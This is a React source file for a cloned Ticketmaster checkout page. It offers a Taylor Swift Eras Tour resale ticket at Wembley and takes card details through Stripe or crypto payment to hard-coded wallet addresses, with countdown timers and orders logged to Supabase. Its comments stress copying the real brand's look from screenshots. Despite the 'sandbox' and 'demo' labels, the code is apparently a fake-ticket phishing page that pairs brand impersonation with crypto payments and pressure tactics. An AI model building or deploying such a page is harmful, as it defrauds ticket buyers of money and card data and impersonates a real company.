import { supabase } from './supabaseClient';
import React, { useState, useEffect } from 'react';
import { loadStripe } from '@stripe/stripe-js';
import { 
  Elements, 
  CardElement, 
  useStripe, 
  useElements 
} from '@stripe/react-stripe-js';
import { 
  CreditCard, 
  Bitcoin, 
  ShieldCheck, 
  Smartphone, 
  User, 
  Clock,
  Copy,
  CheckCircle,
  HelpCircle,
  Lock,
  Sliders,
  ChevronRight
} from 'lucide-react';
import './styles.css';

const stripePromise = loadStripe('pk_test_51Otl6BC9RURXTbJp36L8mO8SjI2KzZ6R8KxlbXwW9E2VpL0M3F4K5J6N7P8Q9R0S1T2U3V4W5X6Y7Z8A9B0C1D2E3F4');

const DEMO_WALLETS = {
  USDC: '0x71C233105B91788c42214C224242424242424242',
  BTC: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
  ETH: '0x71C233105B91788c42214C224242424242424242',
  SOL: 'HN7cABviunccv5Afb2wLk46tu7Y6mH9UN4jE8627z97h'
};

const CRYPTO_PRICES = {
  USDC: '272.50',
  BTC: '0.00342',
  ETH: '0.0912',
  SOL: '1.845'
};

// SUB-COMPONENT: Live Sandbox Stripe Form Node Handler
function InnerStripeForm({ isProcessing, setIsProcessing, cardHolder, setCardHolder, postalCode, setPostalCode, handleOrderComplete }) {
  const stripe = useStripe();
  const elements = useElements();

  const handleCardPayment = async (e) => {
    e.preventDefault();
    if (!stripe || !elements) return;

    setIsProcessing(true);
    try {
      const cardElement = elements.getElement(CardElement);
      const { paymentMethod, error: stripeError } = await stripe.createPaymentMethod({
        type: 'card',
        card: cardElement,
        billing_details: { name: cardHolder, address: { postal_code: postalCode } }
      });

      if (stripeError) throw stripeError;

      const { data, error: dbError } = await supabase
        .from('orders')
        .insert([{
          payment_method: 'stripe_sandbox_card',
          crypto_tx_hash: paymentMethod.id,
          amount_paid_pence: 21500,
          status: 'completed'
        }])
        .select();

      if (dbError) throw dbError;
      handleOrderComplete(data[0].id, 'Credit/Debit Card');
      cardElement.clear();
    } catch (err) {
      alert(`Payment Denied: ${err.message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <form id="stripe-form-node" onSubmit={handleCardPayment}>
      <div className="form-field-group">
        <label className="field-label">Cardholder Name</label>
        <input type="text" value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Wayne Wol" className="input-element" required />
      </div>

      <div className="form-field-group">
        <label className="field-label">Card Credentials</label>
        <div className="stripe-iframe-box">
          <CardElement options={{ style: { base: { fontSize: '15px', color: '#000000' } } }} />
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '8px' }}>
        <div className="form-field-group">
          <label className="field-label">Country</label>
          <select className="select-element">
            <option>Kenya</option>
            <option>United States</option>
            <option>United Kingdom</option>
          </select>
        </div>
        <div className="form-field-group">
          <label className="field-label">Postal Code</label>
          <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} placeholder="00100" className="input-element" required />
        </div>
      </div>
    </form>
  );
}

// MAIN LAYOUT EXPORT COMPONENT
export default function App() {
  const [activeTab, setActiveTab] = useState('card');
  const [timeLeft, setTimeLeft] = useState(465); // Synchronized ~7:45 time remaining clock string
  const [cryptoTimeLeft, setCryptoTimeLeft] = useState(900);
  const [cryptoCoin, setCryptoCoin] = useState('USDC');
  const [copied, setCopied] = useState(false);
  const [txHash, setTxHash] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  useEffect(() => {
    if (cryptoTimeLeft <= 0) return;
    const timer = setInterval(() => setCryptoTimeLeft(prev => prev - 1), 1000);
    return () => clearInterval(timer);
  }, [cryptoTimeLeft]);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(DEMO_WALLETS[cryptoCoin]);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleOrderComplete = (dbRowId, strategyName) => {
    alert(`🎉 ORDER CONCLUDED VIA ${strategyName.toUpperCase()}!\nCloud Reference ID generated in Supabase: ${dbRowId}`);
    setCardHolder('');
    setPostalCode('');
  };

  const handleCryptoSubmit = async (e) => {
    e.preventDefault();
    if (!txHash.trim()) return;

    setIsProcessing(true);
    try {
      const { data, error } = await supabase
        .from('orders')
        .insert([{
          payment_method: `crypto_${cryptoCoin}`,
          crypto_tx_hash: txHash,
          amount_paid_pence: 21500,
          status: 'pending'
        }])
        .select();

      if (error) throw error;
      handleOrderComplete(data[0].id, `Crypto Wallet (${cryptoCoin})`);
      setTxHash('');
    } catch (err) {
      alert(`Database Error: ${err.message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div>
      {/* Authentic Branding Header */}
      <header className="tm-navbar">
        <div className="tm-nav-left">
          <div className="tm-menu-burger">
            <span></span><span></span><span></span>
          </div>
          <span className="tm-brand-logo">ticketmaster</span>
        </div>
        <div className="tm-nav-right">
          <div className="tm-country-pill">
            <div className="tm-flag-circle">🇬🇧</div>
            <span>UK</span>
          </div>
          <User size={20} color="#ffffff" />
        </div>
      </header>

      {/* Top Banner Navigation Row matching image_2a3d40.jpg specs */}
      <div className="event-meta-context">
        <div className="tm-breadcrumbs">Home / Concert Tickets / Rock / Taylor Swift</div>
        <div className="event-title-row">
          <h1 className="event-main-title">Taylor Swift | The Eras Tour</h1>
          <button type="button" className="tm-more-info">More Info</button>
        </div>
        <p className="event-sub-details">Sat • Aug 17 • 6:30 PM • Wembley Stadium, London</p>
        <p className="event-important-note">
          <strong>Important Event Info:</strong> No tickets will be released prior to 72 hours before the event. <span>more</span>
        </p>
      </div>

      {/* Interactive Stadium Map Box Component View */}
      <div className="stadium-canvas-card">
        <button className="toolbar-btn" style={{ borderRadius: '4px', border: '1px solid #bcbfc3', color: '#000', fontSize: '0.75rem', padding: '6px 12px', margin: '0 auto 12px auto', display: 'block' }}>
          Switch to Map
        </button>
        <div className="stadium-map-vector">
          <div className="stadium-stage-node">STAGE</div>
          <div className="map-active-sector">508</div>
        </div>
      </div>

      {/* Sub-toolbar Inputs */}
      <div className="tm-filter-toolbar">
        <select className="toolbar-select"><option>1 Ticket</option></select>
        <button className="toolbar-btn"><Lock size={14} /> Codes</button>
        <button className="toolbar-btn"><Sliders size={14} /> Filters</button>
      </div>
      <p className="all-prices-note">All ticket prices include fees for one (1) ticket. Prices may vary based on demand.</p>

      {/* Main Container Work Area */}
      <main className="checkout-view-grid">
        
        {/* LEFT COLUMN INTERFACE */}
        <div>
          {/* Main Card View: Header Mappings from image_2a3e1e.jpg */}
          <div className="seat-header-row" style={{ padding: '0 4px' }}>
            <div>
              <h2 className="seat-title-text">Sec 508 • Row 20 • Seat 24</h2>
              <p className="verified-resale-label">Verified Resale Ticket</p>
            </div>
            <div className="seat-price-display">
              <span>£215.00</span>
              <span style={{ fontSize: '0.75rem', color: '#000', display: 'block', fontWeight: 500, marginTop: '2px' }}>ea <ChevronRight size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /></span>
            </div>
          </div>

          {/* SPLIT TICKET CARD COMPONENT */}
          <div className="tm-ticket-split-card">
            <div className="split-card-pane">
              <CreditCard size={20} color="#026cdf" style={{ marginTop: '2px' }} />
              <div>
                <h4 className="pane-heading">Standard Ticket</h4>
                <p className="pane-subtext">1 Ticket</p>
              </div>
            </div>
            <div className="split-card-pane">
              <Smartphone size={20} color="#026cdf" style={{ marginTop: '2px' }} />
              <div>
                <h4 className="pane-heading">Mobile Ticket</h4>
                <p className="pane-subtext">Scan barcode from your mobile device.</p>
              </div>
            </div>
          </div>

          {/* UNIFIED DESCRIPTIVE CARD DETAILS GRID */}
          <div className="tm-ticket-details-card">
            <div className="details-card-row">
              <User size={20} color="#52525b" style={{ marginTop: '2px' }} />
              <div className="details-row-body">
                <h4>Single ticket</h4>
                <p>You'll be seated alone.</p>
              </div>
            </div>

            <div className="details-card-row">
              <ShieldCheck size={20} color="#52525b" style={{ marginTop: '2px' }} />
              <div className="details-row-body">
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <h4>Verified Resale Ticket</h4>
                  <HelpCircle size={14} color="#a1a1aa" />
                </div>
                <p>This ticket is verified by Ticketmaster. It may be resold once, closer to the event.</p>
              </div>
            </div>
          </div>

          {/* INTEGRATED SECURE EMBED PANEL TRANSITION */}
          <div className="checkout-form-panel">
            <div className="tab-pill-box">
              <div className={`tab-pill ${activeTab === 'card' ? 'active' : ''}`} onClick={() => setActiveTab('card')}>
                <CreditCard size={14} />
                <span>Card Sandbox</span>
              </div>
              <div className={`tab-pill ${activeTab === 'crypto' ? 'active' : ''}`} onClick={() => setActiveTab('crypto')}>
                <Bitcoin size={14} />
                <span>Crypto Balance</span>
              </div>
            </div>

            {activeTab === 'card' ? (
              <Elements stripe={stripePromise}>
                <InnerStripeForm 
                  isProcessing={isProcessing} 
                  setIsProcessing={setIsProcessing}
                  cardHolder={cardHolder}
                  setCardHolder={setCardHolder}
                  postalCode={postalCode}
                  setPostalCode={setPostalCode}
                  handleOrderComplete={handleOrderComplete}
                />
              </Elements>
            ) : (
              <form onSubmit={handleCryptoSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                <div className="alert-box alert-orange" style={{ display: 'flex', justifyContent: 'space-between' }}>
                  <span>Rate Expiry:</span>
                  <strong>{formatTime(cryptoTimeLeft)}</strong>
                </div>

                <div>
                  <div className="crypto-grid">
                    {['USDC', 'BTC', 'ETH', 'SOL'].map((coin) => (
                      <div key={coin} onClick={() => setCryptoCoin(coin)} className={`crypto-card ${cryptoCoin === coin ? 'active' : ''}`}>
                        <span>{coin}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div style={{ backgroundColor: '#f4f4f5', padding: '12px', borderRadius: '4px', textAlign: 'center' }}>
                  <h2 style={{ fontSize: '1.5rem', fontWeight: 800 }}>{CRYPTO_PRICES[cryptoCoin]} {cryptoCoin}</h2>
                </div>

                <div className="form-field-group">
                  <label className="field-label">Destination Address</label>
                  <div style={{ display: 'flex', gap: '4px' }}>
                    <input type="text" readOnly value={DEMO_WALLETS[cryptoCoin]} className="input-element" style={{ fontFamily: 'monospace', fontSize: '0.75rem', backgroundColor: '#f4f4f5' }} />
                    <button type="button" onClick={handleCopyAddress} style={{ backgroundColor: '#0150a0', color: '#fff', border: 'none', padding: '0 12px', borderRadius: '4px' }}>
                      {copied ? <CheckCircle size={14} /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>

                <div className="form-field-group">
                  <label className="field-label">Transaction Hash Record</label>
                  <input type="text" placeholder="Paste signature receipt string..." className="input-element" value={txHash} onChange={(e) => setTxHash(e.target.value)} required />
                </div>

                <button type="submit" disabled={isProcessing} className="tm-primary-cta" style={{ backgroundColor: '#0150a0' }}>
                  Submit Transaction Verification
                </button>
              </form>
            )}
          </div>
        </div>
      </main>

      {/* Fixed Sticky Action CTA Mobile Dock Container matching screenshot footprints */}
      <footer className="sticky-action-bar">
        <div className="action-bar-top-row">
          <span style={{ fontWeight: 600 }}>1 Ticket</span>
          <span className="tm-timer-text" style={{ color: '#ef4444' }}>{formatTime(timeLeft)} remaining</span>
          <span className="action-total-price">£215.00</span>
        </div>
        
        {activeTab === 'card' ? (
          <button type="submit" form="stripe-form-node" disabled={isProcessing || timeLeft <= 0} className="tm-primary-cta">
            {isProcessing ? 'Verifying Channel Token...' : 'Get Tickets'}
          </button>
        ) : (
          <div style={{ fontSize: '0.75rem', color: '#71717a', textAlign: 'center', fontWeight: 600, padding: '4px 0' }}>
            Complete the Crypto form entries directly inside the workspace layout module.
          </div>
        )}
      </footer>
    </div>
  );
}